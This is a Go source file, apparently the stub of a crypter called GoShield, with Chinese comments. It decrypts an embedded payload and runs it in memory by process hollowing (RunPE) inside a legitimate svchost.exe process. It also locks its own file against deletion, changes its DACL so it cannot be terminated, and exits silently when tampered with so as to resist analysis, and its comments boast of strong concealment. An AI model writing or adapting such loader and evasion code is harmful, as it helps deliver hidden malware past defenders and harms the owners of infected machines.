// 文件路径: stub/main.go
package main

import (
	"os"

	"github.com/Limkon/GoShield/internal/crypto"
	"github.com/Limkon/GoShield/internal/loader"
	"github.com/Limkon/GoShield/internal/protect"
)

// 直接声明全局变量即可，不要用 extern
// Builder 动态生成的 payload.go 也在 package main 下，它们会自动链接
var EncryptionKey []byte
var EncryptedPayload []byte

func main() {
	// 1. 启动最强防御：独占锁定自身防删，修改 DACL 防杀
	protect.EnableProtection()

	// 2. 解密真实程序的 Payload
	decryptedPayload, err := crypto.Decrypt(EncryptedPayload, EncryptionKey)
	if err != nil {
		// 密文损坏或被篡改，静默退出，防分析
		os.Exit(1)
	}

	// 3. 执行内存加载 (RunPE)
	// 这里选择系统自带的合法程序 svchost.exe 作为空壳宿主，隐蔽性极强
	targetHost := "C:\\Windows\\System32\\svchost.exe"
	
	err = loader.Execute(targetHost, decryptedPayload)
	if err != nil {
		os.Exit(1)
	}

	// 4. 保持 Stub 主线程存活，维持防删防杀状态
	// 因为宿主傀儡进程 (svchost) 是异步运行的，Stub 必须保持挂起，否则防御失效
	select {}
}
